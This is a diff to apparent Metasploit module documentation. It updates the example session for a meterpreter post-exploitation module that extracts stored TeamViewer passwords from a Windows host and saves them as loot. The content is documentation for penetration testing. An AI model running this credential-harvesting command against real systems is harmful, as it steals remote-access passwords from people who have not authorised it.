@@ -15,12 +15,11 @@
 ## Scenarios
 
 ```
-meterpreter > run post/windows/gather/credentials/teamviewer_passwords
+meterpreter > run post/windows/gather/credentials/teamviewer_passwords 
 
 [*] Finding TeamViewer Passwords on WEQSQUGO-2156
-[+] Found Options Password: op****@5
-[+] Found Security Password: P@$$w0rd
-[+] Passwords stored in: /root/.msf4/loot/20200128065035_default_***.***.***.***_host.teamviewer__290401.txt
+[+] Found Exported Unattended Password: P@$$w0rd
+[+] Found Options Password: op*****5
+[+] Passwords stored in: /home/blurbdust/.msf4/loot/20200207052401_default_***.***.***.***_host.teamviewer__588749.txt
+meterpreter > 
 ```
-
-
